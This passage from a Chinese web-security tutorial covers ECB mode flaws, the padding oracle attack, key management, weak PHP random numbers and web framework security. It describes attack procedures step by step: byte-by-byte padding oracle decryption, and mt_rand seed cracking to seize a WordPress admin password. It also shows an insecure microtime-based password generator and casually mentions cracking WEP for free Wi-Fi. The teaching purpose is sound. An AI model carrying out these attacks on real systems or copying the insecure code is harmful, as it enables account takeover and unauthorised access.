- 开始暴破

最终成功破解出WEP的KEY，可以免费蹭网了

#### <font color="yellow">011 ECB模式的缺陷</font>

前面讲到了流密码加密算法中的几种常见的攻击方法，在分组加密算法中，也有一些可能被攻击者利用的地方，如果开发者不熟悉这些问题，就有可能错误地使用加密算法，导致安全隐患，对于分组加密算法来说，除去算法本身，还有一些通用的加密模式，不同的加密算法会支持同样的几种加密模式

常见的加密模式

- ECB
- CBC
- CFB
- OFB
- CTR
- ...

如果加密模式被攻击，那么不论加密算法的密钥有多长，都可能不再安全，ECB模式(电码簿模式)是最简单的一种加密模式，它的每个分组之间相对独立，但ECB模式最大的问题也是出在这种分组的独立性上，攻击者只需要对调任意分组的密文，在经过解密后，所得明文的顺序也是经过对调的3-DES每个分组为8个字节，对比plain加密后的密文，可以看到，仅仅block 1的密文不同，而block 2的密文是完全一样的，也就是说，block 1并未影响到block 2的结果，这与链式加密模式(CBC)等是完全不同的，链式加密模式的分组前后之间会互相关联，一个字节的变化，会导致整个密文发生变化，这一特点也可以用于判断密文是否是用ECB模式加密的，对于ECB模式来说，改变分组密文的顺序，将改变解密后的明文顺序，替换某个分组密文，解密后该对应分组的明文也会被替换，而其他分组不受影响，ECB模式并未完全混淆分组间的关系，因此当分组足够多时，仍然会暴露一些私密信息，而链式模式则避免了此问题，当需要加密的明文多于一个分组的长度时，应该避免使用ECB模式，而使用其他更加安全的加密模式

#### <font color="yellow">012 Padding Oracle Attack</font>

在Eurocrypt 2002 大会上，Vaudenay介绍了针对CBC模式的Padding Oracle Attack，它可以在不知道密钥的情况下，通过对padding bytes的尝试，还原明文，或者构造出任意明文的密文，在2010年的BlackHat欧洲大会上，Juliano Rizzo与Thai Duong介绍了Padding Oracle在实际中的攻击案例[http://net.ifera.com/research/](http://net.ifera.com/research/)，并公布了ASP.NET存在的Padding Oracle问题[http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3332](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-3332)，在2011年的Pwnie Rewards中，ASP.NET的这个漏洞被评为最具价值的服务器端漏洞[http://pwnies.com/winners](http://pwnies.com/winners)，分组加密算法在实现加/解密时，需要把消息进行分组(block)，block的大小常见的有

- 64bit
- 128bit
- 256bit

在解密完成后，如果最后的padding值不正确，解密程序往往会抛出异常(padding error)，而利用应用的错误回显，攻击者往往可以判断出padding是否正确，所以Padding Oracle实际上是一种边信道攻击，攻击者只需要知道密文的解密结果是否正确即可，而这往往有许多途径，比如在Web应用中，如果是padding不正确，则应用程序很可能会返回500的错误，如果padding正确，但解密出来的内容不正确，则可能会返回200的自定义错误

正确的padding值只可能为

- 1个字节的padding为0x01
- 2个字节的padding为0x02,0x02
- 3个字节的padding为0x03,0x03,0x03
- 4个字节的padding为0x04,0x04,0x04,0x04

因此慢慢调整IV的值，以希望解密后，最后一个字节的值为正确的padding byte，比如一个0x01，因为Intermediary Value是固定的(我们此时不知道Intermediary Value的值是多少)，因此从0x00到0xFF之间，只可能有一个值与Intermediary Value的最后一个字节进行XOR后，结果是0x01，通过遍历这255个值，可以找出IV需要的最后一个字节，通过XOR运算，可以马上推导出此Intermediary Byte的值，在正确匹配了padding为0x01后，需要做的是继续推导出剩下的Intermediary Byte，根据padding的标准，当需要padding两个字节时，其值应该为0x02，0x02，而我们已经知道了最后一个Intermediary Byte为0x3D，因此可以更新IV的第8个字节为0x3D ^ 0x02 = 0x3F，此时可以开始遍历IV的第7个字节(0x00~0xFF)，获得Intermediary Value后，通过与原来的IV进行XOR运算，即可得到明文，在这个过程中仅仅用到了密文和IV，通过对padding的推导，即可还原出明文，而不需要知道密钥是什么，而IV并不需要保密，它往往是以明文形式发送的，如何通过Padding Oracle使得密文能够解密为任意明文呢，实际上通过前面的解密过程可以看出，通过改变IV，可以控制整个解密过程，因此在已经获得了Intermediary Value的情况下，很快就可以通过XOR运算得到可以生成任意明文的IV，而对于多个分组的密文来说，从最后一组密文开始往前推，以两个分组为例，第二个分组使用的IV是第一个分组的密文(cipher text)，因此当推导出第二个分组使用的IV时，将此IV值当做第一个分组的密文，再次进行推导，Brian Holyfield实现了一个叫padbuster的工具，可以自动实施Padding Oracle攻击，[http://bole.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html](http://bole.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html)，[http://github.com/GDSSecurity/PadBuster](http://github.com/GDSSecurity/PadBuster)，[http://hi.baidu.com/aullik5/blog/item/7e769d2ec68b2d241f3089ce.html](http://hi.baidu.com/aullik5/blog/item/7e769d2ec68b2d241f3089ce.html)，Padding Oracle Attack的关键在于攻击者能够获知解密的结果是否符合padding，在头现和使用CBC模式的分组加密算法时，注意这一点即可

#### <font color="yellow">013 密钥管理</font>

密码学基本原则：密码系统的安全性应该依赖于密钥的复杂性，而不应该依赖于算法的保密性

在安全领域里，选择一个足够安全的加密算法不是困难的事情，难的是密钥管理，在一些实际的攻击案例中，直接攻击加密算法本身的案例很少，而因为密钥没有妥善管理导致的安全事件却很多，对于攻击者来说，他们不需要正面破解加密算法，如果能够通过一些方法获得密钥，则是件事半功倍的事情，密钥管理中最常见的错误，就是将密钥硬编码在代码里，同样的，将加密密钥、签名的salt等key硬编码在代码中，是非常不好的习惯

硬编码的密钥，在以下几种情况下可能被泄露

- 代码被广泛传播

    这种泄露途径常见于一些开源软件

    有的商业软件并不开源，但编译后的二进制文件被用户下载，也可能被逆向工程反编译后，泄露硬编码的密钥

- 软件开发团队的成员都能查看代码，从而获知硬编码的密钥

    开发团队的成员如果流动性较大，则可能会由此泄露代码

对于第一种情况，如果一定要将密钥硬编码在代码中，我们尚可通过Diffie-Hellman交换密钥体系，生成公私钥来完成密钥的分发，对于第二种情况，则只能通过改善密钥管理来保护密钥，对于Web应用来说，常见的做法是将密钥(包括密码)保存在配置文件或者数据库中，在使用时由程序读出密钥并加载进内存，密钥所在的配置文件或数据库需要严格的控制访问权限，同时也要确保运维或DBA中具有访问权限的人越少越好，在应用发布到生产环境时，需要重新生成新的密钥或密码，以免与测试环境中使用的密钥相同，当黑客已经入侵之后，密钥管理系统也难以保证密钥的安全性，比如攻击者获取了一个webshell，那么攻击者也就具备了应用程序的一切权限，由于正常的应用程序也需要使用密钥，因此对密钥的控制不可能限制住webshell的正常请求，密钥管理的主要目的，还是为了防止密钥从非正常的渠道泄露，定期更换密钥也是一种有效的做法，一个比较安全的密钥管理系统，可以将所有的密钥(包括一些敏感配置文件)都集中保存在一个服务器(集群)上，并通过Web Service的方式提供获取密钥的API，每个Web应用在需要使用密钥时，通过带认证信息的API请求密钥管理系统，动态获取密钥，Web应用不能把密钥写入本地文件中，只加载到内存，这样动态获取密钥最大程度地保护了密钥的私密性，密钥集中管理，降低了系统对于密钥的耦合性，也有利于定期更换密钥

#### <font color="yellow">014 伪随机数问题</font>

伪随机数(pseudo random number)问题——伪随机数不够随机，是程序开发中会出现的一个问题，一方面，大多数开发者对此方面的安全知识有所欠缺，很容易写出不安全的代码，另一方面，伪随机数问题的攻击方式在多数情况下都只存在于理论中，难以证明，因此在说服程序员修补代码时也显得有点理由不够充分，但伪随机数问题是真实存在的、不可忽视的一个安全问题，伪随机数，是通过一些数学算法生成的随机数，并非真正的随机数，密码学上的安全伪随机数应该是不可压缩的，真随机数，则是通过一些物理系统生成的随机数，比如电压的波动、硬盘磁头读/写时的寻道时间、空中电磁波的噪声

##### <font color="yellow">0001 弱伪随机数的麻烦</font>

Luciano Bello发现了Debian上的OpenSSL包中存在弱伪随机数算法，产生这个问题的原因，是由于编译时会产生警告(warning)信息，因此下面的代码被移除了，这直接导致的后果是，在OpenSSL的伪随机数生成算法中，唯一的随机因子是pid，而在Linux系统中，pid的最大值也是32768，这是一个很小的范围，因此可以很快地遍历出所有的随机数，受到影响的有，从2006.9到2008.5.13的debian平台上生成的所有ssh key的个数是有限的，都是可以遍历出来的，这是一个非常严重的漏洞，同时受到影响的还有OpenSSL生成的key以及OpenVPN生成的key，Debian随后公布了这些可以被遍历的key的名单，这次事件的影响很大，也让更多的开发者开始关注伪随机数的安全问题，在Web应用中，使用伪随机数的地方非常广泛，密码、key、SessionID、token等许多非常关键的secret往往都是通过伪随机数算法生成的，如果使用了弱伪随机数算法，则可能会导致非常严重的安全问题

##### <font color="yellow">0002 时间真的随机吗</font>

很多伪随机数算法与系统时间有关，而有的程序员甚至就直接使用系统时间代替随机数的生成，这样生成的随机数，是根据时间顺序增长的，可以从时间上进行预测，从而存在安全隐患，比如下面这段代码，其逻辑是用户取回密码时，会由系统随机生成一个新的密码，并发送到用户邮箱

```php
function sendPSW()
{
    ......
    $messenger = &$this->system->loadModel('system/messenger');echo microtime()."<br/>";
    $passwd = substr(md5(print_r(microtime(),true)),0,6);
    ......
}
```

这个新生成的`$passwd`，是直接调用了`microtime()`后，取其MD5值的前6位，由于MD5算法是单向的哈希函数，因此只需要遍历`microtime()`的值，再按照同样的算法，即可猜解出`$passwd`的值，PHP中的`microtime()`由两个值合并而成，一个是微秒数，一个是系统当前秒数，因此只需要获取到服务器的系统时间，就可以以此时间为基数，按次序递增，即可猜解出新生成的密码，因此这个算法是存在非常严重的设计缺陷的，程序员预想的随机生成密码，其实并未随机，<font color="red">在开发程序时，要切记不要把时间函数当成随机数使用</font>

##### <font color="yellow">0003 破解伪伪随机数算法的种子</font>

在PHP中，常用的随机数生成算法有`mnd()`、`mt_rand()`，可见，`rand()`的范围其实是非常小的，如果使用`rand()`生成的随机数用于一些重要的地方，则会非常危险，其实PHP中的`mt_rand()`也不是很安全，Stefan Esser在他著名的papermt_srand and not so random numbers中提出了PHP的伪随机函数`mt_rand()`在实现上的一些缺陷[http://www.suspekt.org/2008/8/17/mt_srand-and-not-so-ranfom-numbers/](http://www.suspekt.org/2008/8/17/mt_srand-and-not-so-ranfom-numbers/)，伪随机数是由数学算法实现的，它真正随机的地方在于种子(seed)，种子一旦确定后，再通过同一伪随机数算法计算出来的随机数，其值是固定的，多次计算所得值的顺序也是固定的，在PHP4.2.0之前的版本中，是需要通过`srand()`或`mt_srand()`给`rand()`、`mt_rand()`播种的，在PHP 4.2.0之后的版本中不再需要事先通过`srand()`、`mt_srand()`播种，比如直接调用`mt_rand()`，系统会自动播种，在PHP 4.2.0之后的版本中，如果没有通过播种函数指定seed，而直接调用`mt_rand()`，则系统会分配一个默认的种子，在32位系统上默认的播种的种子最大值是2^32，因此最多只需要尝试2^32次就可以破解seed，可以看出，当seed确定时，第一次到第n次通过`mt_rand()`产生的值都没有发生变化

建立在这个基础上，就可以得到一种可行的攻击方式

- 通过一些方法猜解出种子的值
- 通过`mt_srand()`对猜解出的种子值进行播种
- 通过还原程序逻辑，计算出对应的mt_rand()产生的伪随机数的值

需要注意的是，在PHP 5.2.1及其之后的版本中调整了随机数的生成算法，但强度未变，因此在实施猜解种子时，需要在对应的PHP版本中运行猜解程序，在Stefan Esser的文中还提到了一个小技巧，可以通过发送Keep-Alive HTTP头，迫使服务器端使用同一PHP进程响应请求，而在该PHP进程中，随机数在使用时只会在一开始播种一次，在一个Web应用中，有很多地方都可以获取到随机数，从而提供猜解种子的可能，Stefan Esser提供了一种Cross Application Attacks的思路，即通过前一个应用在页面上返回的随机数值，猜解出其他应用生成的随机数值，如果服务器端将`$search_id`返回到页面上，则攻击者就可能猜解出当前的种子，这种攻击确实可行，比如一个服务器上同时安装了WordPress与phpBB,可以通过phpBB猜解出种子，然后利用WordPress的密码取回功能猜解出新生成的密码

Stefan Esser描述这个攻击过程如下

- 使用Keep-Alive HTTP请求在phpBB2论坛中搜索字符串`'a'`
- 搜索必然会出来很多结果，同时也泄露了`search_id`
- 很容易通过该值猜解出随机数的种子
- 攻击者仍然使用Keep-Alive HTTP头发送一个重置admin密码的请求给WordPress blog
- WordPress `mt_rand()`生成确认链接，并发送到管理员邮箱
- 攻击者根据已算出的种子，可以构造出此确认链接
- 攻击者确认此链接(仍然使用Keep-Alive头)，WordPress将向管理员邮箱发送新生成的密码
- 因为新密码也是由mt_rand()生成的，攻击者仍然可以计算出来
- 从而攻击者最终获取了新的管理员密码

##### <font color="yellow">0004 使用安全的随机数</font>

我们需要谨记，在重要或敏感的系统中，一定要使用足够强壮的随机数生成算法，在Java中，可以使用`java.security.SecureRandom`，而在Linux中，可以使用`/dev/random`或者`/dev/urandom`来生成随机数，只需要读取即可，而在PHP 5.3.0及其之后的版本中，若是支持openSSL扩展，也可以直接使用函数来生成随机数，除了以上方法外，从算法上还可以通过多个随机数的组合，以增加随机数的复杂性，比如通过给随机数使用MD5算法后，再连接一个随机字符，然后再使用MD5算法一次，这些方法，也将极大地增加攻击的难度

#### <font color="yellow">015 总结</font>

在加密算法的选择和使用上，有以下最佳实践

- 不要使用ECB模式
- 不要使用流密码(比如RC4)
- 使用HMAC-SHA1代替MD5(甚至是代替SHA1)
- 不要使用相同的key做不同的事情
- salts与IV需要随机产生
- 不要自己实现加密算法，尽量使用安全专家已经实现好的库
- 不要依赖系统的保密性

当你不知道该如何选择时，有以下建议

- 使用CBC模式的AES256用于加密
- 使用HMAC-SHA512用于完整性检查
- 使用带salt的SHA-256 或SHA-512 用于Hashing

### <font color="yellow">06 Web框架安全</font>

目前主流的JavaScript框架排名中，jQuery和Ext可算是佼佼者，获得了用户的广泛好评，国内的一些框架很多也是仿照jQuery对JavaScript进行了包装，不过这些框架的鼻祖YUI还是坚持用自己的JavaScript类库，jQuery是目前用的最多的前端JavaScript类库，据初步统计，目前jQuery的占有率已经超过46%，它算是比较轻量级的类库，对DOM的操作也比较方便到位，支持的效果和控件也很多，同时，基于jQuery有很多扩展项目，包括jQuery UI(jQuery支持的一些控件和效果框架)、jQuery Mobile(移动端的jQuery框架)、QUnit(JavaScript的测试框架)、Sizzle(CSS的选择引擎)，这些补充使得jQuery框架更加完整，更令人兴奋的是，这些扩展与目前的框架基本都是兼容的，可以交叉使用，使得前端开发更加丰富，Ext是Sencha公司推崇的JavaScript类库，相比jQuery，Ext JS更重量级，动辄数兆的文件，使得Ext在外网使用的时候会顾虑很多，但是，另一方面，在Ext JS庞大的文件背后是Ext JS强大的功能，Ext JS的控件和功能可以说强大和华丽到了让人发指的程度，图表、菜单、特效，Ext JS的控件库非常丰富，同时它的交互也非常强大，独立靠Ext JS几乎就可以取代控制层完成于客户的交互，强大的功能，丰富的控件库，华丽的效果也使得Ext JS成为内网开发利器，框架鼻祖YUI也有自己的JavaScript类库，DOM操作和效果处理也还比较方便，功能和控件也很齐全，但是相比jQuery和Ext JS 显得比较中庸一些，随着Yahoo!的没落，YUI的呼声也逐渐被新起的框架淹没，想来也让人惋惜

#### <font color="yellow">001 Bootstrap</font>

Boostrap绝对是目前最流行用得最广泛的一款框架，它是一套优美，直观并且给力的web设计工具包，可以用来开发跨浏览器兼容并且美观大气的页面，它提供了很多流行的样式简洁的UI组件，栅格系统以及一些常用的JavaScript插件

Bootstrap是用动态语言LESS写的，主要包括四部分的内容

- 脚手架

	全局样式，响应式的12列栅格布局系统，记住Bootstrap在默认情况下并不包括响应式布局的功能，因此，如果你的设计需要实现响应式布局，那么你需要手动开启这项功能

- 基础CSS

    包括基础的HTML页面要素，比如表格(table)，表单(form)，按钮(button)，以及图片(image)，基础CSS为这些要素提供了优雅，一致的多种样式

- 组件

    收集了大量可以重用的组件，如下拉菜单(dropdowns)，按钮组(button groups)，导航面板(navigation control)——包括tabs，pills，lists标签，面包屑导航(breadcrumbs)以及页码(pagination)，缩略图(thumbnails)，进度条(progress bars)，媒体对象(media objects)等等

- JavaScript

    包括一系列jQuery的插件，这些插件可以实现组件的动态页面效果，插件主要包括模态窗口(modals)，提示效果(tool tips)，泡芙效果(popovers)，滚动监控(scrollspy)，旋转木马(carousel)，输入提示(typeahead)，等等

Bootstrap已经足够强大，能够实现各种形式的Web界面，为了更加方便地利用Bootstrap进行开发，很多工具和资源可以用来配合使用，下面列举了其中的一部分工具和资源

- jQuery UI Bootstrap

    对于jQuery和Bootstrap爱好者来说这是个非常好的资源，能够把Bootstrap的清爽界面组件引入到jQuery UI中

- jQuery Mobile Bootstrap Theme

    和上面提到的jQuery UI主题类似，这是一个为jQuery mobile建立的主题

    如果你想让用Bootstrap开发的网站在手机端也可以优雅访问，那么这个资源对你来说很方便易用

- Fuel UX

    它为Bootstrap添加了一些轻量的JavaScript控件

    Fuel UI安装，修改，更新以及优化都很简单方便

- StyleBootstrap.info

    Bootstrap提供了自己的几种界面风格，StyleBootstrap提供了更多的配色选项，并且你可以给每个组件都应用不同的配色

- BootSwatchr

    利用这个工具你可以立刻查看主题修改后的效果

    对于每一次变动的效果，这个应用都会生成一个唯一的URL方便你与他人分享，你也可以在任意时刻修改你的主题

- Bootswatch
  
    提供大量免费的Bootstrap主题

- Bootsnipp

    在线前端框架交互组件制作工具，是一个供给设计师和开发者的基于Bootstrap HTML/CSS/JavaScript架构的免费元素

- LayoutIt

  	通过界面拖放生成器简便快捷地创建基于Bootstrap的前端代码
    
    通过拖放动作将Bootstrap风格的组件加入到你的个人设计里并且可以方便地修改他们的属性，简单便捷

#### <font color="yellow">002 Fbootstrapp</font>

Fbootstrapp基于Bootstrap并且提供了跟Facebook iframe apps和设计相同的功能，包含用于所有标准组件的基本的CSS和HTML，包括排版、表单、按钮、表格、栅格、导航等等，风格与Facebook类似

#### <font color="yellow">003 BootMetro</font>

BootMetro框架的灵感来自于Metro UI CSS，基于Bootstrap框架构建，用于创建Windows 8的Metro风格的网站，它包括所有Bootstrap的功能，并添加了几个额外的功能，比如页面平铺，应用程序栏等等

#### <font color="yellow">004 Kickstrap</font>

Kickstrap是Bootstrap的一个变体，它基于Bootstrap，并在它的基础上添加了许多app，主题以及附加功能，这使得这个框架可以单独地用于构建网站，而不需要额外安装什么，你需要做的仅仅是把它放到你的网站上，然后用就可以了，App是一些页面加载完成之后加载运行的JavaScript和CSS打包文件，默认加载的app有Knockout.js，Retina.js，Firebug Lite，and Updater，你也可以自行添加更多的app，选择不同的主题可以让你的网站在众多Bootstrap构建的类似网站中显得与众不同，附加功能是一些用来扩展Bootstrap UI库的附件，它们的语法基本相同或者相似

#### <font color="yellow">005 Foundation</font>

Foundation 是一款强大的，功能丰富的并且支持响应式布局的前端开发框架，你可以通过Foundation快速创建原型，利用它所包含的大量布局框架，元素以及最优范例快速创建在各种设备上可以正常运行的网站以及app，Foundation在构建的时候秉承移动优先的策略，它拥有大量实用的语义化功能，并且使用Zepto类库来取代jQuery，这样可以带来更好的用户体验，并且提高运行的速度，Foundation拥有一套12列的灵活可嵌套的网格系统，你可以用它快速创建适应多种浏览设备的布局，它有很多的功能，它定义了很多的样式，比如字体排版，按钮，表单，以及多种多样的导航控件，它也提供了很多的CSS组件，例如操作面板(panels)，价格表(price tables)，进度条(progress bars)，表格(tables)以及可以适应不同设备的可伸缩视频(flex video)，与此同时，Foundation还包括了很多的JavaScript插件，如下拉菜单(dropdowns)，joyride(网站功能引导插件)，magellan(网站固定导航插件)，orbit(支持触摸的响应式图片轮播插件)，reveal(弹出框插件)，sections(强大的tab插件)以及tooltips(工具提示)等

Foundation框架还提供了很多有用的扩展

- 模板(Stencils)

    Foundation框架中的所有UI元素都有Omnigraffle stencils以及矢量PDF两种格式的下载，你可以用它们来方便快捷的绘制线框图和原型图

- HTML模板

    HTML模板可以方便地用来快速创建页面布局

    你所要做的仅仅是复制得到模板代码，然后丢到页面的标签之间就好了

- 图标字体(Icon Fonts)

    包含自定义图标的一种网页字体

- SVG社交网络图标(Social Icons)

    一组不依赖分辨率的社交网络图标(可缩放矢量图标)

- 响应式表格

    Foundation框架中响应式表格的实现机制是固定表格的左边第一列，然后表格的其他列可以通过滚动条拖拉进行访问

- 关闭帆布布局(Off-Canvas Layouts)

    这些布局可以允许一些网页内容或者导航控件在移动端设备上默认隐藏，当浏览屏幕变大或者用户进行相应操作的时候这些内容再出现

    当用户进行相关操作的时候，网页内容或者导航控件将会滑动出现

#### <font color="yellow">006 GroundworkCSS</font>

GroundworkCSS 是前端框架家族里面新添的一款小清新框架，它是基于Sass和Compass的一个高级响应式的HTML5，CSS以及JavaScript工具包，可以用于快速创建原型并且建立在各种浏览设备上可以正常工作的网站和app，GroundworkCSS拥有一个灵活，可嵌套的流式网格系统，方便你创建任何布局，这个框架有很多让人印象深刻的功能，比如在平板以及移动端上的网格系统，当屏幕的宽度小于768或者480像素时，页面中原本并列排版的表格列(grid column)会自动变为独立的行，而不是折叠在一起，另一个很酷的功能是jQuery的响应式文本(ResponsiveText)插件，这个插件可以动态调整页面文字的大小以适应浏览设备的屏幕大小，这个插件对于可伸缩的标题以及创建响应式表格的时候特别有用，GroundworkCSS包含了大量的UI组件，如tabs、响应式数据表格导航、按钮、表单、响应式导航控件、tiles(一套替代radio按钮以及其他默认表单元素的优雅组件)、工具提示、对话框、Cycle2(一款强大的，响应式的内容滑块)以及其他很多的有用组件，它还提供了很多矢量社交网络图标以及图标字体，可以通过切换页面上方的导航按钮选择不同的浏览设备要来查看这款框架的效果，通过这种方式，你可以测试在不同的浏览设备上各种组件的响应式布局情况，GroundworkCSS的文档写的非常好，并且包含着很多的示例，为了让你更快的上手，他还提供了多种响应式的模板，对于这款框架，唯一我可以想到的缺点就是不能自定义要下载的框架内容

#### <font color="yellow">007 Gumby</font>

Gumby是一款基于Sass和Compass的简单灵活并且稳定的前端开发框架，它的流式-固定布局(fluid-fixed layout)可以根据桌面端以及移动设备的分辨率自动优化要呈现的网页内容，它支持多种网格布局，包括多列混杂的嵌套模式，Gumby提供两套PSD的模板，方便你在12列和16列的网格系统上进行设计，Gumby提供了一个功能丰富的UI工具包，包括按钮，表单，移动端导航，tabs，跳转链接(skip links)，拨动开关(toggles and switches，可以方便快捷地切换元素的class，而不需要进行额外的js操作)，抽屉功能(drawers)，响应式图片以及retina图片等等，为了紧跟最近的设计潮流，Gumby的UI元素中还包括了Metro风格的扁平化设计，你也可以用Pretty风格的渐变设计，或者按照你的想法糅合两种设计风格，该框架还提供了一套出众的响应式，拥有独立分辨率的Entypo图标，你可以在自己的web项目中尽情使用，Gumby有一个很好自定义下载选择器，你可以自行配置各个组件的颜色，并且按自己的需求方便地下载

#### <font color="yellow">008 HTML KickStart</font>

HTML Kickstart是一款可以用来方便创建任何布局的集合Html5，CSS和jQuery的工具包，它提供了干净，符合标准以及跨浏览器兼容的代码，这款框架提供了多种样式表，包括网格，排版，表单，按钮，表格，列表以及一些跨浏览器兼容的web组件比如JavaScript的幻灯片功能，tabs，面包屑导航，包含子菜单的菜单以及工具提示等等，你可以使用99Lime UIKIT提供的UI组件来搭建你的产品线框图

#### <font color="yellow">009 IVORY</font>

IVORY是一款轻量，简单但是强大的前端框架，可以用于320到1200像素宽度的响应式布局，它基于12列的响应式网格布局，包含表格，按钮，表格，分页，拨动开关，工具提示，手风琴，选项卡等网站中常用的组件和样式

#### <font color="yellow">010 Kube</font>

如果你的新项目需要一款实在的，不需要复杂的额外功能组件的，足够简单的框架，那么Kube将会是你正确的选择，Kube是一款最小化的，支持响应式的前端框架，它没有强加的样式设计，因此给了你充分的自由来开发自己的样式表，它提供了一些web元素的基本样式，比如网格，表单，排版，表格，按钮，导航，链接以及图片等等，Kube框架包括一个简洁的CSS文件用于方便地创建响应式布局，还包括了两个JS文件来完成tab以及页面的按钮操作，如果你希望得到Kube最大化的灵活性以及个性化定制，那么你可以下载开发者版本(developer version)，这个版本包括了LESS文件(包括各种变量，mixins以及模块)

#### <font color="yellow">011 Web框架</font>

Web框架(Web framework)或者叫做Web应用框架(Web application framework)，是用于进行Web开发的一套软件架构，大多数的Web框架提供了一套开发和部署网站的方式，为Web的行为提供了一套支持支持的方法，使用Web框架，很多的业务逻辑外的功能不需要自己再去完善，而是使用框架已有的功能就可以

##### <font color="yellow">0001 Web框架的功能</font>

Web框架使得在进行Web应用开发的时候，减少了工作量，Web框架主要用于动态网络开发，动态网络主要是指现在的主要的页面，可以实现数据的交互和业务功能的完善，使用Web框架进行Web开发的时候，在进行数据缓存、数据库访问、数据安全校验等方面，不需要自己再重新实现，而是将业务逻辑相关的代码写入框架就可以，也就是说，通过对Web框架进行主观上的缝缝补补，就可以实现自己进行Web开发的需求了，以PHP为例，PHP可以在apache服务器上进行Web开发，而不必使用框架，使用PHP进行开的时候，在不适用框架的情况下，数据库连接就需要自己来实现，页面的生成和显示也是一样，比如框架的话可以完成避免sql注入的工作，而使用PHP在不用框架的情况下，这部分要自己做，目前Python主流的框架有Django和Flask等，Django是一个比较重量级的框架，重量级的意思是说，Django几乎所有的功能都帮助开发者写好了，有时候如果想做一个简单的网站，并不需要太多功能，这时候使用Django的话，就比较不合适，因为在部署网站的时候会导致很多不必要的功能也部署了进来，而Flask是一个轻量级的框架，一些核心的功能实现了，但是实现的功能并没有Django那么多，这样可以进行自己的发挥，在Flask的基础上，如果想实现更多的功能，可以很方便地加入，Java目前的主流开发框架是ssm(spring spring-mvc和mybatis)，相比之前的ssh(spring struts hibernate)，ssm也是比较轻量级的框架，为了便于理解，个人创造了一个比方，如果将Web框架比作是旋律，歌词比作是业务逻辑，那么就是不同的歌曲，旋律可能有些地方不满足人的需求，可以进行修改，也可以在基础上增加新的旋律，或者是将框架比作素描的结果，然后在素描的基础上进行涂色，然后就可以成为一副画了

##### <font color="yellow">0002 总结</font>

Web框架是用来进行Web应用开发的一个软件架构，主要用于动态网络开发，开发者在基于Web框架实现自己的业务逻辑，Web框架实现了很多功能，为实现业务逻辑提供了一套通用方法

#### <font color="yellow">012 服务器Web框架</font>

服务器端框架(亦称web应用框架)使编写、维护和扩展web应用更加容易，它们提供工具和库来实现简单、常见的开发任务，包括路由处理，数据库交互，会话支持和用户验证，格式化输出(HTML，JSON，XML)，提高安全性应对网络攻击

##### <font color="yellow">0001 直接处理HTTP请求和响应</font>

web框架允许你编写简单语法的代码，即可生成处理这些请求和回应的代码，这意味着你的工作变得简单、交互变得简单、并且使用抽象程度高的代码而不是底层代码，每一个view函数(请求的处理者)接受一个包含请求信息的HttpRequest对象，并且被要求返回一个包含格式化输出的HttpResponse(在下面的例子中是一个字符串)

```python
# Django view function
from django.http import HttpResponse
def index(request):
    # Get an HttpRequest (request)
    # perform operations using information from the request.
    # Return HttpResponse
    return HttpResponse('Output string to return')
```

##### <font color="yellow">0002 MVC框架安全</font>

实施安全方案，要达到好的效果，必须要完成两个目标

- 安全方案正确、可靠
- 能够发现所有可能存在的安全问题，不出现遗漏

只有深入理解漏洞原理之后，才能设计出真正有效、能够解决问题的方案，本书的许多篇幅，都是介绍漏洞形成的根本原因,比如真正理解了XSS、SQL注入等漏洞的产生原理后，想彻底解决这些顽疾并不难，但是，方案光有效是不够的，要想设计出完美的方案，还需要解决第二件事情，就是找到一个方法，能够让我们快速有效、不会遗漏地发现所有问题，而Web开发框架，为我们解决这个问题提供了便捷，在现代Web开发中，使用MVC架构是一种流行的做法，MVC是Modd-View-Controller的缩写，它将Web应用分为三层，View层负责用户视图、页面展示等工作，Controller负责应用的逻辑实现，接收View层传入的用户请求，并转发给对应的Model做处理，Model层则负责实现模型，完成数据的处，从数据的流入来看，用户提交的数据先后流经了View层、Controller、Model层，数据的流出则反过来，在设计安全方案时，要牢牢把握住数据这个关键因素，在MVC框架中，通过切片、过滤器等方式，往往能对数据进行全局处理，这为设计安全方案提供了极大的便利，比如在Spring Security中，通过URL pattern实现的访问控制，需要由框架来处理所有用户请求，在Spring Security获取了URL handler基础上，才有可能将后续的安全检查落实，在Spring Security的配置中，第一步就是在web.xml文件中增加一个filter，接管用户数据             ，然而数据的处理是复杂的，数据经过不同的应用逻辑处理后，其内容可能会发生改变，比如数据经过toLowercase，会把大写变成小写，而一些编码解码，则可能会把GBK变成Unicode码，这些处理都会改变数据的内容，因此在设计安全方案时，要考虑到数据可能的变化，认真斟酌安全检查插入的时机，我们并没有使用PHP的`magic_quotes_gpc`作为一项对抗SQL注入的防御方案，这是因为`magic_quotes_gpc`是有缺陷的，它并没有在正确的地方解决问题，`magic_quotes_gpc`实际上是调用了一次`addslashes()`，将一些特殊符号(比如单引号)进行转义，变成了\'，对应到MVC架构里，它是在View层做这件事情的，而SQL注入是Model层需要解决的问题，结果如何呢，黑客们找到了多种绕过`magic_quotes_gpc`的办法，比如使用GBK编码、使用无单引号的注入等，PHP官方在若干年后终于开始正视这个问题，于是在官方文档的描述中不再推荐大家使用它[http://php.net/manual/en/security.magicquotes.php](http://php.net/manual/en/security.magicquotes.php)，一般来说，我们需要先想清楚要解决什么问题，深入理解这些问题后，再在正确的地方对数据进行安全检查，一些主要的Web安全威胁，如XSS、CSRF、SQL注入、访问控制、认证、URL跳转等不涉及业务逻辑的安全问题，都可以集中放在MVC框架中解决

在框架中实施安全方案，比由程序员在业务中修复一个个具体的bug，有着更多的优势

- 有些安全问题可以在框架中统一解决，能够大大节省程序员的工作量，节约人力成本

    当代码的规模大到一定程度时，在业务的压力下，专门花时间去一个个修补漏洞几乎成为不可能完成的任务

- 对于一些常见的漏洞来说，由程序员一个个修补可能会出现遗漏，而在框架中统一解决，有可能解决遗漏的问题

    这需要制定相关的代码规范和工具配合

- 在每个业务里修补安全漏洞，补丁的标准难以统一，而在框架中集中实施的安全方案，可以使所有基于框架开发的业务都能受益，从安全方案的有效性来说，更容易把握

##### <font color="yellow">0003 将请求路由到相关的handler中</font>

大多数的站点会提供一系列不同资源，通过特定的URL来访问，如果都放在一个函数里面，网站会变得很难维护，所以web框架提供一个简单机制来匹配URL和特定处理函数，这种方式对网站维护也有好处，因为你只需要改变用来传输特定功能的URL而不用改变任何底层代码，不同的框架使用不同机制进行匹配，比如Flask(Python)框架通过使用装饰器来增加视图的路由

```python
@app.route("/")
def hello():
    return "Hello World!"
```

